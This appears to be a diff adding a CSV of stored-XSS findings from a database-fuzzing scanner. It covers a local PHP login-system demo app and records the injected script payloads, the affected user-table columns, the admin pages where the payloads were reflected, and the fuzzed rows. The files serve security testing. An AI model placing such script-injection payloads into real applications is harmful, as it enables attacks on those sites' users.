@@ -1,0 +1,40 @@
+web app,DB source,reflection sink,id,payload,description
+userlogin,users.lname,"http://localhost/loginsystem/admin/lastthirtyays-reg-users.php
+http://localhost/loginsystem/admin/lastthirtyays-reg-users.php#
+http://localhost/loginsystem/admin/manage-users.php
+http://localhost/loginsystem/admin/manage-users.php#
+http://localhost/loginsystem/admin/search-result.php
+http://localhost/loginsystem/admin/user-profile.php?uid=13",911832,"""'><script>xss(911832)</script>","
+            loginsystem.users.lname[0][2]
+            original row: [13, 'Anuj', 'Kumar', 'phpgurukulteam@gmail.com', 'Test@123', '1234567890', datetime.datetime(2021, 8, 9, 18, 30)]
+            fuzzed row: [13, 'Anuj', '""\'><script>xss(911832)</script>', 'phpgurukulteam@gmail.com', 'Test@123', '1234567890', datetime.datetime(2021, 8, 9, 18, 30)]
+            change: 'Kumar' => '""'><script>xss(911832)</script>'
+            
+fuzzed after scan 3 / 5
+found as XSS in scan 4 / 5"
+userlogin,users.email,"http://localhost/loginsystem/admin/lastthirtyays-reg-users.php
+http://localhost/loginsystem/admin/lastthirtyays-reg-users.php#
+http://localhost/loginsystem/admin/manage-users.php
+http://localhost/loginsystem/admin/manage-users.php#
+http://localhost/loginsystem/admin/search-result.php
+http://localhost/loginsystem/admin/user-profile.php?uid=13",922959,"""'><script>xss(922959)</script>","
+            loginsystem.users.email[0][3]
+            original row: [13, 'Anuj', 'Kumar', 'phpgurukulteam@gmail.com', 'Test@123', '1234567890', datetime.datetime(2021, 8, 9, 18, 30)]
+            fuzzed row: [13, 'Anuj', 'Kumar', '""\'><script>xss(922959)</script>', 'Test@123', '1234567890', datetime.datetime(2021, 8, 9, 18, 30)]
+            change: 'phpgurukulteam@gmail.com' => '""'><script>xss(922959)</script>'
+            
+fuzzed after scan 4 / 5
+found as XSS in scan 5 / 5"
+userlogin,users.fname,"http://localhost/loginsystem/admin/lastthirtyays-reg-users.php
+http://localhost/loginsystem/admin/lastthirtyays-reg-users.php#
+http://localhost/loginsystem/admin/manage-users.php
+http://localhost/loginsystem/admin/manage-users.php#
+http://localhost/loginsystem/admin/search-result.php
+http://localhost/loginsystem/admin/user-profile.php?uid=13",997083,"""'><script>xss(997083)</script>","
+            loginsystem.users.fname[0][1]
+            original row: [13, 'Anuj', 'Kumar', 'phpgurukulteam@gmail.com', 'Test@123', '1234567890', datetime.datetime(2021, 8, 9, 18, 30)]
+            fuzzed row: [13, '""\'><script>xss(997083)</script>', 'Kumar', 'phpgurukulteam@gmail.com', 'Test@123', '1234567890', datetime.datetime(2021, 8, 9, 18, 30)]
+            change: 'Anuj' => '""'><script>xss(997083)</script>'
+            
+fuzzed after scan 2 / 5
+found as XSS in scan 3 / 5"
